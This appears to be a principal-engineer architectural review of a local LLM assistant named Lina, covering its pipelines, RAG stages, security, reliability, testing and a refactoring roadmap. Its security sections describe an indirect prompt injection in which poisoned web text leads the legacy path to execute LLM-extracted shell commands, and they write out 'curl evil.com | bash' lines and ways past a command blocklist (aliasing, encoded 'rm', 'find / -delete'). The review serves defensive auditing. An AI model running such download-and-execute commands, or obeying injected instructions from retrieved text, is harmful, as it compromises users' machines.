# Lina v1.0.0 — Principal Engineer Architectural Review

> Дата: 2026-03-10  
> Scope: ~140K строк Python, 394 файла, 54 пакета  
> Метод: deep code read (~15K строк ядра) + automated subagent analysis  
> Формат: verified claims — каждый вывод подтверждён конкретным кодом

---

## Содержание

- [Executive Summary](#executive-summary)
- [1. System Architecture — Layer Analysis](#1-system-architecture--layer-analysis)
- [2. Critical Findings (C1–C7)](#2-critical-findings)
- [3. PipelineContext — God Object Analysis](#3-pipelinecontext--god-object-analysis)
- [4. RAG Pipeline Deep Analysis](#4-rag-pipeline-deep-analysis)
- [5. Security Assessment](#5-security-assessment)
- [6. Reliability & Fault Tolerance](#6-reliability--fault-tolerance)
- [7. Observability Assessment](#7-observability-assessment)
- [8. Testing Strategy](#8-testing-strategy)
- [9. Significant Concerns (SC1–SC10)](#9-significant-concerns)
- [10. Code Reduction Plan: 140K → 70K](#10-code-reduction-plan-140k--70k)
- [11. Architecture Roadmap: Perplexity-Level](#11-architecture-roadmap-perplexity-level)
- [12. Top 10 Prioritised Recommendations](#12-top-10-prioritised-recommendations)

---

## Executive Summary

Lina — **~140K-line Python AI assistant**, running local LLMs (GGUF via llama-cpp-python) on Linux.
Architecture: **14-step deterministic pipeline** + **17-stage RAG orchestrator** + formal governance FSM + multi-layer security + circuit breakers + 2144 tests.

Design philosophy: *"LLM works ONLY with verified facts, never with raw web text"* — enforced structurally.

**Honest assessment:** This is a production-grade AI system architecture. For a single developer — exceptionally rare level of engineering discipline. The codebase is roughly at **Senior/Staff engineer level** for a local AI system.

### Verdict Matrix

| Area | Grade | Verdict |
|------|-------|---------|
| Pipeline Design | **A** | 14-step deterministic, single entry point, structural verification |
| RAG Pipeline | **A-** | 17 stages, fact-checked, anti-hallucination — but no semantic compression |
| Security | **B+** | Zero-trust input layer strong; command execution paths need hardening |
| Reliability | **A-** | Formal circuit breakers, degradation, FSM governance |
| Observability | **B+** | Per-stage timing + W3C trace context; no external export |
| Testing | **A** | 2144 tests — unit, integration, stress, chaos, red-team, concurrency |
| Code Health | **B** | Two competing pipelines, ~30% reducible, God Object risk |
| Performance | **B-** | Synchronous RAG pipeline, no concurrent stages, no async I/O |

### Top 6 Risks (Priority Order)

| # | Risk | Severity |
|---|------|----------|
| 1 | Split-brain: Commander vs MainPipeline | **Critical** |
| 2 | PipelineContext — 40-field mutable God Object | **High** |
| 3 | Indirect prompt injection → tool execution | **High** |
| 4 | Synchronous RAG pipeline (5–10s latency) | **Medium-High** |
| 5 | Weak source diversity in fact verification | **Medium** |
| 6 | Truncation-only context compression | **Medium** |

---

## 1. System Architecture — Layer Analysis

```
┌──────────────────────────────────────────────────────────────┐
│ INTERFACE:  CLI (repl.py) │ GUI (app.py) │ D-Bus │ Hotkey   │
├──────────────────────────────────────────────────────────────┤
│ INPUT:  InputValidator (zero-trust) → IntentRouter (16 intents) │
├──────────────────────────────────────────────────────────────┤
│ APPLICATION:                                                  │
│   MainPipeline (14 steps, 1081 lines) ← CANONICAL entry point│
│   Commander (1570 lines) ← LEGACY, has own LLM/security stack│
│   RuntimeAPIv2 (407 lines) ← DEPRECATED facade               │
├──────────────────────────────────────────────────────────────┤
│ DOMAIN:                                                       │
│   PipelineV3 (17 stages RAG)    │ LLMEngine (dual model)     │
│   SafetyValidator (3-tier)      │ DegradationStrategy         │
│   PolicyEngine + StateMachine   │ ConversationState            │
│   FactPipeline + FactVerifier   │ QueryUnderstanding           │
├──────────────────────────────────────────────────────────────┤
│ INFRASTRUCTURE:                                               │
│   ResponseCache │ FactStore │ KnowledgeIndexer │ VectorStore  │
│   ParallelSearch (DDG+Brave+SearXNG+Wiki) │ EmbeddingModel   │
├──────────────────────────────────────────────────────────────┤
│ EXTERNAL:  llama-cpp-python │ curl │ ~30 subprocess callers   │
└──────────────────────────────────────────────────────────────┘
```

### Verified Strengths

**S1. Single entry point enforcement.**  
`MainPipeline.process_request()` — the ONLY public processing method. Three verification functions enforce this invariant:
- `verify_pipeline_order()` — checks step ordering
- `verify_single_entry_point()` — no other public processing methods
- `verify_all_modules_isolated()` — modules don't call each other directly

**S2. PipelineContext isolation.**  
`FinalResponse` returns only `(text, status, source)`. Internal `PipelineContext` ~40 fields — NEVER leaves the pipeline boundary. Clean API boundary.

**S3. Anti-hallucination as structural invariant.**  
- MainPipeline step_07: web_search path **refuses LLM fallback** — returns personalized error
- PipelineV3 `_no_results_answer()`: factual intents (`product_spec`, `hardware`, `price`) **refuse** to answer without search results
- LLM engine: explicit KV cache reset (`llama_kv_cache_clear()`) between generations to prevent cross-query contamination

**S4. Decision/execution separation.**  
`DegradationStrategy` returns `DegradationAction` — caller applies. `SafetyValidator` returns `SafetyVerdict` — caller decides. `PolicyEngine` returns `PolicyCheckResult` — caller acts. No decision module has execution side effects.

**S5. Formal governance FSM.**  
`StateMachine` with validated transitions, guard functions, on_enter/on_exit callbacks, audited history (`deque(maxlen=1000)`). Two FSMs: installer (12 states) + runtime (11 states).

**S6. Per-stage timing — ALREADY EXISTS.**  
Both `MainPipeline` (14 timed steps via `ctx.stage_timings[name]`) and `PipelineV3` (19+ `trace.record()` calls) comprehensively track per-stage latency. This negates the "missing observability" claim.

**S7. Domain trust scoring — ALREADY EXISTS.**  
`DomainRanker` has 37 hardcoded domain scores (0–1):
- gsmarena.com=0.95, arxiv.org=0.90, wikipedia=0.88, stackoverflow=0.85
- E-commerce penalized: aliexpress=0.25, wildberries=0.30
- 5-signal weighted formula: 0.35×domain + 0.30×keyword + 0.15×freshness + 0.10×diversity + 0.10×position

**S8. Fact extraction is regex-based, NOT LLM-based.**  
18 compiled spec patterns (processor, RAM, battery, display, etc.) + key-value pattern + table normalizer. Instant, deterministic, zero token cost. This negates the "fact extraction through LLM is expensive" claim.

---

## 2. Critical Findings

### C1. Split-Brain Architecture — Commander vs MainPipeline ★★★

**The most serious structural issue.** Two independent command processing paths:

| Component | Lines | Own Stack |
|-----------|-------|-----------|
| **MainPipeline** | 1081 | 21+ Phase 22-26 modules, governance, degradation, tracing |
| **Commander** | 1570 | **Separate** LLMEngine, MiniLLMEngine, RuntimeAPIv2, SafetyGuard, RAGLayer, ConversationState, PromptBuilder, ResponsePipeline, OutputCleaner, ModelManager, ToolExecutor + all Phase 16 subsystems |

Commander instantiates its **own** LLMEngine, its **own** security stack, its **own** conversation buffer. RuntimeAPIv2 is **marked deprecated** ("Заменён на MainPipeline").

**Impact:**
- Different security/validation chains per path
- Two separate trust boundaries
- Two independent context windows
- Impossible to reason about system-wide invariants
- Double memory consumption (two LLM engines possible)

**Recommendation:** Commander → thin dispatcher. All LLM/RAG/tool processing delegated to `MainPipeline.process_request()`. Commander keeps only: meta-commands, builtin pattern matching, macro expansion, chain parsing.

### C2. Indirect Prompt Injection → Tool Execution ★★★

**Verified in code.** Commander's legacy `_handle_llm_query()` path:

```python
# commander.py ~line 1190
commands = extract_commands(final)  # parses ```bash blocks from LLM output
if commands:
    exec_results = self._sys_executor.execute_many(commands)
```

`extract_commands()` (system_interaction.py) parses markdown code blocks from LLM responses and extracts shell commands.

**Attack vector:** If LLM generates a response containing commands found in **retrieved web text** (e.g., a malicious page instructing `curl evil.com | bash`), those commands are extracted and evaluated. Guards exist (`_DANGEROUS_RE`, `_SAFE_AUTO_RE`) but check against known-dangerous patterns only.

**Critical note:** The V3 pipeline path does NOT have this vulnerability — it returns text + sources only. But the legacy path is still active.

**Recommendation:**
1. Mark LLM-retrieved commands as `untrusted_origin`
2. Never execute commands when source includes web_search context
3. Require explicit user confirmation for ANY extracted command
4. Migration to V3 path eliminates the risk entirely

### C3. SecurityConfig.blocked_commands — Trivially Bypassable ★★

`SecurityConfig.is_command_safe()` — substring check against a blocklist. Bypassable via:
- Command aliasing: `alias rm='rm'`
- PATH manipulation
- `find / -delete` (semantic equivalent, not in list)
- Encoded payloads: `$'\x72\x6d'`

The real security is in `InputValidator` (obfuscation detection, Unicode NFC) + `SafetyValidator` (3-tier pattern matching). But **it's not confirmed that Commander routes all commands through both layers**.

**Recommendation:** Remove `SecurityConfig.is_command_safe()`. Enforce: all command execution → `InputValidator.validate_text()` → `SafetyValidator.validate()` → governance approval.

### C4. WebConfig.host Defaults to `0.0.0.0` ★★

Binds to **all interfaces** by default. On public WiFi, this exposes system command execution to the network.

**Recommendation:** Default `127.0.0.1`. Require explicit opt-in.

### C5. Global Mutable Config Singleton ★★

`config = LinaConfig()` at module level, mutable at runtime (`config.verbose`, `config.web.enabled`). No synchronization. Race conditions under concurrent GUI + CLI threads.

Config also creates directories on import (side effect in `__init__`).

**Recommendation:** Freeze `LinaConfig` (frozen=True). Session overrides → `PipelineContext`. Directory creation → explicit `ensure_directories()` at bootstrap.

### C6. _fetch_html Uses subprocess curl ★

`PipelineV3._fetch_html()` spawns `curl` per page — no connection pooling, new process each time, non-portable.

**Verified:** ~30 files make ~80+ subprocess calls across the codebase. Heavy callers: `core/tools.py` (~18), `core/web_search_engine.py` (~10), `core/application_resolver.py` (~10).

**Recommendation:** Use `urllib.request.urlopen()` or `httpx` for HTTP. Keep subprocess for system tools that genuinely need it (package managers, audio control, etc.).

### C7. ResponseCache Writes on Every Miss ★

`ResponseCache._save()` serializes entire JSON on every cache write. Disk I/O on every LLM generation.

**Recommendation:** Batch writes (every 30s or on shutdown). Consider SQLite for concurrent safety.

---

## 3. PipelineContext — God Object Analysis

### What the code actually shows

`PipelineContext` has **~40 fields** organized by step number:

```
Step 1:  runtime_state, mode_profile, config, capabilities, degradation_state, session_budget
Step 2:  intent, confidence, is_system_command
Step 3:  priority_level, priority_desc
Step 4:  plan, plan_hash, primary_path, fallback_path, validation_policy, ...
Step 5:  integrity_passed, integrity_message
Step 6:  locked
Step 6b: rag_context
Step 7:  raw_response, execution_path, tokens_prompt, tokens_generated
Step 8:  cleaned_response, post_modifications, leak_found
Step 9:  guard_passed, guard_violations
Step 10: validation_score, validation_issues, can_retry
Step 11: degradation_action, degradation_reason
Step 12: consistency_score, drift_detected
Step 13: budget_exhausted
Step 14: trace_id
Meta:    regeneration_attempts, final_status, errors, stage_timings
```

### Verified mutation patterns

**Steps are MOSTLY well-isolated** — each writes to its own fields. Two exceptions:

1. **Step 5 mutates Step 1 fields** on integrity failure: writes to `ctx.mode_profile`, `ctx.config["safe_mode"]`
2. **Step 11 mutates everything** — re-invokes Steps 7–10 during regeneration, temporarily trims `ctx.rag_context`

### Is it a God Object?

**Partially.** It's structured (labeled by step) and doesn't leak outside the pipeline (good). But:

- Any step **can** read any field (implicit dependency graph)
- Order-dependent: reordering steps would break things silently
- Hard to test individual steps without constructing the full context
- Step 11's re-invocation pattern creates a loop in what should be a linear pipeline

### Recommended evolution (not urgent — improvement, not emergency)

```python
# Instead of one PipelineContext with 40 fields:

@dataclass(frozen=True)
class IntentOutput:
    intent: str
    confidence: float
    is_system_command: bool

@dataclass(frozen=True)
class PlanOutput:
    plan: Any
    plan_hash: str
    primary_path: str
    ...

@dataclass(frozen=True)
class ExecutionOutput:
    raw_response: str
    execution_path: str
    tokens_prompt: int
    tokens_generated: int

# Steps become pure functions:
def step_02(input: str, runtime: RuntimeSnapshot) -> IntentOutput: ...
def step_04(intent: IntentOutput, runtime: RuntimeSnapshot) -> PlanOutput: ...
def step_07(plan: PlanOutput, input: str) -> ExecutionOutput: ...
```

**Benefit:** Explicit dependency graph, testable stages, eliminate mutation surprises.

**Cost:** Significant refactor. Not urgent — current system works. Priority: after Commander unification.

---

## 4. RAG Pipeline Deep Analysis

### Stage Coverage

| # | Stage | Present | Quality | Notes |
|---|-------|---------|---------|-------|
| 0 | Response cache | ✅ | Good | TTL-based, SHA-256 keys |
| 1 | Query understanding | ✅ | Good | Intent + entities + attributes + language |
| 2 | Conversation state | ✅ | Good | Pronoun resolution, 5-min entity TTL |
| 3 | Fact store cache | ✅ | Good | TTL=3600s, max 200 entities, JSON persistence |
| 4 | Query rewriting | ✅ | Good | 3-5 variants, RU→EN translation, error handling |
| 5 | Parallel multi-engine search | ✅ | Excellent | DDG + Brave + SearXNG + Wikipedia, ThreadPoolExecutor |
| 6 | Result merger (RRF) | ✅ | Excellent | Reciprocal Rank Fusion + dedup + spam filter |
| 7 | Domain re-ranking | ✅ | Good | 37 domain scores, 5-signal weighted formula |
| 8 | Page download + HTML clean | ✅ | Okay | curl subprocess, max 3 workers |
| 9 | Semantic ranking | ✅ | Good | TF-IDF fallback when no embedding model |
| 10 | Fact extraction | ✅ | Good | 18 regex patterns — instant, deterministic, zero LLM cost |
| 11 | Fact aggregation | ✅ | Good | Cross-source merge, boost for multi-source |
| 12 | Fact verification | ✅ | Okay | Single-domain cap at 0.50 — but no independent source grouping |
| 13 | Context compression | ⚠️ | Weak | Character-level truncation only, no semantic compression |
| 14 | LLM generation (fact mode) | ✅ | Good | Strict "only use provided facts" prompt |
| 15 | Self-check | ✅ | Good | Hallucination detection with retry |
| 16 | Quality gate → re-search | ✅ | Good | Re-search when facts <2 or confidence <0.35 |
| 17 | Finalize | ✅ | Good | Cache + conversation state update |

### What's Missing (confirmed by code analysis)

**1. Semantic context compression.** Current compression is `text[:max_chars]` — character truncation. This wastes tokens on irrelevant passages. Needs: passage → summary → fact candidates (LLM-based or extractive).

**2. Source diversity requirement.** `FactVerifier` caps confidence at 0.50 when all facts come from one domain. But `require_multi_source=False` by default, so single-source facts are *kept*. No ownership-level diversity check (gsmarena.com + phonearena.com count as "diverse" but may share data).

**3. Correlated hallucination defense.** If 3 SEO sites copy the same wrong spec, cross-source verification confirms the error. Need: source independence score, not just unique domain count.

### What EXISTS and was incorrectly challenged

- ✅ **Domain trust scoring** — DomainRanker with 37 domains and weighted formula
- ✅ **Per-stage timing** — Both pipelines track all stage latencies
- ✅ **Fact extraction is regex-based** — 18 patterns, zero LLM cost, instant

---

## 5. Security Assessment

### Verified Security Layers

| Layer | Implementation | Grade |
|-------|----------------|-------|
| Input Validation | `InputValidator` — length, null byte, control chars, NFC, 6 obfuscation patterns | **A** |
| Domain Allowlisting | `VALID_SOURCES` (8 sources), `VALID_DOMAINS` (16 domains) as frozensets | **A** |
| Command Safety | `SafetyValidator` — whitelist + pattern matching + optional LLM analysis | **B+** |
| Prompt Injection | `PromptSeal` + `_clean_answer()` (10+ regex) + KV cache reset | **B+** |
| Shell Execution | `SubprocessSandbox` + `SafeShell` + governance for `!commands` | **B** |
| KV Cache Isolation | Explicit `llama_kv_cache_clear()` between generations | **A** |
| **Tool Execution from Web** | **_DANGEROUS_RE guard only — no web-origin tracking** | **C** |

### Critical Gap: Indirect Prompt Injection

The legacy Commander path extracts `bash` code blocks from LLM responses and executes them. When the LLM's context includes web search results, malicious web content can inject commands:

```
User: "How do I speed up my system?"
Web page (poisoned): "```bash\ncurl evil.com/payload | bash\n```"
LLM includes the code block → extract_commands() → execute
```

Guard regex catches `rm -rf`, `dd`, `mkfs` — but not:
- Novel download-and-execute patterns
- Python/perl one-liners disguised as system commands
- Legitimate-looking `pip install malicious-package`

**The V3 path is immune** — it returns text only. Migration closes this vector.

---

## 6. Reliability & Fault Tolerance

| Mechanism | Implementation | Grade |
|-----------|----------------|-------|
| Circuit Breaker | `DegradationStrategy` — 4-tier: validation(2), tool(3), llm(3), general(5) | **A** |
| Safe Fallback | Every pipeline step catches Exception → safe default | **A** |
| Model Fallback | mini→full→full→mini silent chain, resource pre-check | **A-** |
| Idle Unload | Configurable timeout, auto-unload after inactivity | **Good** |
| Resource Check | RAM/CPU before model load; fail-closed when check unavailable | **A** |
| Regeneration | Step 11: retry with trimmed RAG (200 chars), mode switch (safe/strict) | **Good** |
| Governance Sync | RuntimeStateManager → StateMachine FSM sync on critical changes | **Good** |
| **LLM Timeout** | **NO timeout on LLM generation — thread can block indefinitely** | **C** |
| **Retry Backoff** | **V3 re-search has no delay — rapid-fire to search engines** | **C+** |

### Concern: Defensive try/except density

The codebase has **dozens** of `try: ... except Exception: return safe_response` blocks. This is intentionally defensive ("never crash"), but creates diagnostic difficulty:

- Silent failures accumulate
- Root cause analysis requires log scanning
- Error metrics may undercount real issues

**Mitigant:** The errors ARE logged and recorded to `ctx.errors` / `trace.errors` — they're not silently swallowed. The degradation system tracks failure streaks. This is actually a reasonable fail-safe pattern for a single-user assistant.

---

## 7. Observability Assessment

| Capability | Status | Detail |
|------------|--------|--------|
| Structured Logging | ✅ | Per-module loggers, categorized |
| Request Tracing | ✅ | `ExecutionTracer` — ring buffer (maxlen=50), intent/path/tokens/duration |
| W3C Trace Context | ✅ | `TraceContext` with traceparent + baggage propagation |
| **Per-Stage Timing** | ✅ | **14 timed steps in MainPipeline + 19 timed stages in PipelineV3** |
| Metrics | ✅ | `LinaMetrics` — response time, P95, error rate, source distribution |
| Audit Trail | ✅ | `audit_command()` — command/response/elapsed |
| Flamegraph Export | ✅ | `FlamegraphExporter` in runtime_v2 |
| Error Taxonomy | ✅ | `ErrorTaxonomy` for classified errors |
| **External Export** | ❌ | No Prometheus, OTLP, file-based export |
| **Thread Safety** | ⚠️ | `LinaMetrics` has no Lock (deque.append GIL-atomic, aggregation is not) |

**Bottom line:** Observability is comprehensive for a local app. Main gap: all telemetry is in-memory — lost on crash.

---

## 8. Testing Strategy

| Category | Files | Coverage |
|----------|-------|----------|
| Unit Tests | ~15 | Core pipeline, V3 pipeline, fact pipeline, voice, engine |
| Integration Tests | 12 | Phase 9-15, adaptive routing, OS execution, agent, observability |
| Concurrency Tests | 3 | ThreadPoolExecutor + soak tests |
| Stress Tests | 5 | 50/100 parallel sessions, burst rate limiting, token budget isolation |
| Security Red-Team | 2 | Injection, escalation, bypass attempts |
| Chaos Engineering | 1 | Fault injection, resilience testing |
| **Total** | **58 files, 2144 tests passing** | |

**Strengths:** Concurrency soak tests, security red-team tests, and chaos engineering tests are extremely unusual for a personal project.

**Weaknesses:**
- Custom stress runner uses subprocess + stdout parsing instead of pytest-native parallelism
- Tests manually reset singletons (fragile, requires updating for new singletons)
- No mutation testing

---

## 9. Significant Concerns

### SC1. Regex Intent Classification Scalability

IntentRouter: ~60+ compiled regex across 16 intent types. Issues:
- Overlapping patterns (WEATHER vs WEB_SEARCH for "погода Москва цена телефона")
- Priority hierarchy is implicit (OPEN_APPLICATION > WEATHER_QUERY > WEB_SEARCH > WEB)
- Adding new intents requires careful analysis of all existing patterns

**Mitigant:** For a Russian-language assistant, regex-based routing is actually more reliable than small-LLM classification given the 2-3B model size. The mini LLM in Commander already provides a second-level fallback.

**Evolution path:** Two-tier: regex → coarse routing, mini LLM → disambiguation.

### SC2. Synchronous RAG Pipeline

V3 pipeline is sequential:
```
search (1-3s) → download (2-5s) → parse (0.5s) → rank (0.2s) → generate (2-4s)
```
Total: 5-12 seconds per web query.

**Partial mitigant:** `_download_and_split()` uses `ThreadPoolExecutor(max_workers=3)` for page downloading. But search→merge→rank→extract→generate is serial.

**Recommendation:** Parallelize:
```
search ──┬── download ──┬── parse ──┬── extract
         │              │           │
         └── (overlap)  └── chunk   └── embed
```

### SC3. TF-IDF Fallback Without Embedding Model

When no embedding model is available, `SemanticRanker` falls back to TF-IDF. Quality drop is significant for semantic matching.

**Recommendation:** Bundle a lightweight embedding model (e.g., `all-MiniLM-L6-v2` at 80MB) as a recommended dependency.

### SC4. QueryClassifier Sticky 120s

After ANY full-model query, system stays on full (7B+) for 120 seconds. Wastes resources on simple follow-ups.

**Recommendation:** Reduce to 30s, or make sticky per-topic.

### SC5. No LLM Generation Timeout

`LLMEngine.generate()` calls model with no timeout. If model enters infinite repetition loop, thread blocks indefinitely.

**Recommendation:** `concurrent.futures.ThreadPoolExecutor` with 60s timeout.

### SC6. Thread Safety Gap in LinaMetrics

`LinaMetrics` — `deque(maxlen=10000)` without Lock. `deque.append` is GIL-atomic, but aggregation operations (iterate + count) are not.

### SC7. Correlated Hallucination Risk

FactVerifier checks domain count but not source independence. Three sites copying the same spec sheet → verification confirms error.

### SC8. V3 Re-search Without Backoff

`_search_and_answer()` immediately retries with broadened queries. No delay → rate limiting risk.

### SC9. Truncation-Only Context Compression

Context "compression" is `text[:max_chars]`. Factual content may be at the end of passages. Needs extractive summarization or at minimum sentence-boundary-aware truncation.

### SC10. Too Many Subprocess Callers

~30 files make ~80+ subprocess calls. Each `subprocess.run()` creates a new process. Heavy callers: `core/tools.py`(~18), `core/web_search_engine.py`(~10), `core/application_resolver.py`(~10).

For HTTP calls: use `urllib.request` or `httpx`. Keep subprocess for genuine system tools.

---

## 10. Code Reduction Plan: 140K → 70K

Based on verified code analysis:

### Phase 1: Unify Pipelines (−15K lines)

| Action | Est. Savings |
|--------|-------------|
| Remove Commander's duplicate LLM/security/RAG stack | −5K |
| Remove RuntimeAPIv2 facade (deprecated) | −2K |
| Merge Commander into thin dispatcher over MainPipeline | −3K |
| Remove duplicate intent classification (BUILTIN_PATTERNS → IntentRouter) | −2K |
| Remove runtime_v2 legacy subsystems | −3K |

### Phase 2: Consolidate Security (−3K lines)

| Action | Est. Savings |
|--------|-------------|
| Merge SecurityConfig + InputValidator + SafetyValidator into unified SecurityPipeline | −1.5K |
| Remove `SecurityConfig.is_command_safe()` (replaced by SafetyValidator) | −0.5K |
| Consolidate PromptSeal + SafeShell + FileGuard API surface | −1K |

### Phase 3: Remove Boilerplate (−5K lines)

| Action | Est. Savings |
|--------|-------------|
| Replace custom retry/cache logic with `tenacity` + `cachetools` | −2K |
| Consolidate FSM helpers and validation wrappers | −1K |
| Merge overlapping utility modules | −1K |
| DRY test fixtures (shared singleton reset, common mock setup) | −1K |

### Phase 4: Identify Dead Code (−5-10K lines)

| Action | Est. Savings |
|--------|-------------|
| runtime/ (v1 — entirely superseded by runtime_v2) | −5K? |
| Legacy compat shims | −1-2K |
| Unused Phase modules (if any) | varies |

**Total estimated reduction: 28–33K lines → ~107–112K lines (Phase 1–4)**

**Note:** Going below ~70K requires removing features (e.g., GUI, voice, installer mode, CV), not just consolidation.

---

## 11. Architecture Roadmap: Perplexity-Level

### Current state vs target:

```
CURRENT (Lina v1.0.0)              TARGET (Lina v2.0)
─────────────────────              ──────────────────
Web search → facts → LLM          Hybrid retrieval → compressed context → LLM
One pipeline active at a time      Concurrent pipeline stages
Fixed context size                 Adaptive context sizing
Regex fact extraction              Regex + mini-LLM extraction
Single-turn memory                 Knowledge graph memory
Character truncation               Semantic context compression
Fixed domain scores                Learning domain trust scores
```

### Roadmap: 7 upgrades

#### 1. Unified Pipeline (Priority 1 — unblocks everything)

```
GUI / CLI / Voice / D-Bus
         │
    InputValidator
         │
    IntentRouter
         │
    MainPipeline.process_request()  ← ONLY entry
    ┌────┴────┐
    │ builtin │ system_cmd │ diagnostic │ web_search │ chat │ tool │
    └─────────────────────────────────────────────────────────────┘
```

Commander becomes a routing helper, not an execution engine.

#### 2. Semantic Context Compression (Priority 2 — improves quality)

Add a stage between fact extraction and LLM generation:

```
passages (50K chars)
    ↓
extractive summarization (sentence scoring)
    ↓
compressed context (5K chars)
    ↓
LLM generation
```

Implementation: Score sentences by entity/keyword density. Select top-N sentences that cover fact set. No LLM needed — pure algorithmic.

#### 3. Hybrid Retrieval (Priority 3 — improves recall)

```
query
 ├── web search (DDG/Brave/SearXNG/Wiki)     ← existing
 ├── local knowledge base (VectorStore)        ← existing (RAG)
 └── knowledge memory (verified fact graph)    ← NEW
      │
      merge + rank + deduplicate
```

#### 4. Knowledge Memory (Priority 4 — incremental intelligence)

Extend FactStore from flat key-value to a simple knowledge graph:

```python
@dataclass
class KnowledgeNode:
    entity: str                    # "Realme 10"
    facts: Dict[str, VerifiedFact]  # predicate → fact
    relations: List[Relation]       # "manufactured_by" → "Realme"
    last_verified: float
    source_diversity: int

class KnowledgeGraph:
    def query(self, entity, predicate=None) -> List[VerifiedFact]: ...
    def add_verified(self, fact_set: FactSet) -> None: ...
    def relate(self, entity1, relation, entity2) -> None: ...
```

Over time, the assistant builds verified knowledge — no need to re-search known facts.

#### 5. Adaptive Context Sizing (Priority 5)

```python
def estimate_complexity(query: str, intent: str) -> ContextSize:
    if intent == "chat": return ContextSize.SMALL    # 1K tokens
    if intent == "weather": return ContextSize.SMALL  # 1K tokens
    if intent == "web_search": return ContextSize.LARGE  # 3K tokens
    if is_multi_entity(query): return ContextSize.LARGE
    return ContextSize.MEDIUM  # 2K tokens
```

Simple → small context → fast.  
Complex → large context → thorough.

#### 6. Concurrent Pipeline Stages (Priority 6)

```python
async def search_and_process(queries, max_pages):
    # Stage 5+8: search and download in parallel
    search_task = asyncio.create_task(parallel_search(queries))
    
    # Stage 6: merge results as they arrive
    async for batch in search_task.stream():
        merged = merger.merge_incremental(batch)
        # Stage 8: download and extract from early results
        # while later search engines still returning
        ...
```

Estimated latency reduction: 30-40% (overlap search + download + processing).

#### 7. Dual-Model Reasoning (Priority 7)

```
mini model (3B):           full model (7B+):
├── query rewrite         ├── final answer generation
├── intent disambiguation ├── complex reasoning
├── ranking assistance    └── code generation
└── fact summarization
```

Mini for fast, disposable reasoning. Full for quality generation. Already partially present (MiniLLMEngine exists) — needs tighter integration.

---

## 12. Top 10 Prioritised Recommendations

| # | Action | Impact | Effort | Priority |
|---|--------|--------|--------|----------|
| 1 | **Unify Commander → MainPipeline** | Eliminates split-brain, −15K lines, closes C2 security gap | High | **P0** |
| 2 | **Lock WebConfig.host to 127.0.0.1** | Closes network exposure, zero effort | Low | **P0** |
| 3 | **Add LLM generation timeout (60s)** | Prevents indefinite hangs | Low | **P0** |
| 4 | **Block tool execution from web-context LLM output** | Closes indirect prompt injection | Medium | **P1** |
| 5 | **Freeze LinaConfig, move to DI** | Eliminates race conditions, improves testability | Medium | **P1** |
| 6 | **Add semantic context compression** | Better answers, lower token waste | Medium | **P1** |
| 7 | **Strengthen fact verification (source diversity)** | Reduces correlated hallucination risk | Low | **P2** |
| 8 | **Replace HTTP subprocess with urllib/httpx** | Better performance, connection pooling | Medium | **P2** |
| 9 | **Add knowledge memory (graph)** | Incremental intelligence, faster repeated queries | High | **P2** |
| 10 | **Concurrent pipeline stages** | 30-40% latency reduction | High | **P3** |

---

## Appendix: Claim Verification Matrix

Several claims from external review were verified against actual code:

| Claim | Verdict | Evidence |
|-------|---------|----------|
| "No pipeline stage timing" | ❌ **FALSE** | Both pipelines have comprehensive per-stage timing |
| "No source trust model" | ❌ **FALSE** | DomainRanker: 37 domains, 5-signal formula |
| "Fact extraction through LLM is expensive" | ❌ **FALSE** | 18 regex patterns, zero LLM cost |
| "No context compression" | ⚠️ **PARTIAL** | Exists as truncation, not semantic compression |
| "PipelineContext is a God Object" | ⚠️ **PARTIAL** | Fields labeled by step, mostly isolated — but implicit deps exist |
| "Synchronous RAG pipeline" | ✅ **TRUE** | Download parallelized, but search→generate is serial |
| "Weak source diversity in verification" | ✅ **TRUE** | Single-domain cap only; no independence check |
| "Indirect prompt injection risk" | ✅ **TRUE** | Legacy Commander path executes LLM-extracted commands |
| "Split-brain Commander vs MainPipeline" | ✅ **TRUE** | Most critical structural issue |
| "Too much defensive try/except" | ⚠️ **NUANCED** | Errors are logged + tracked, not silently swallowed |
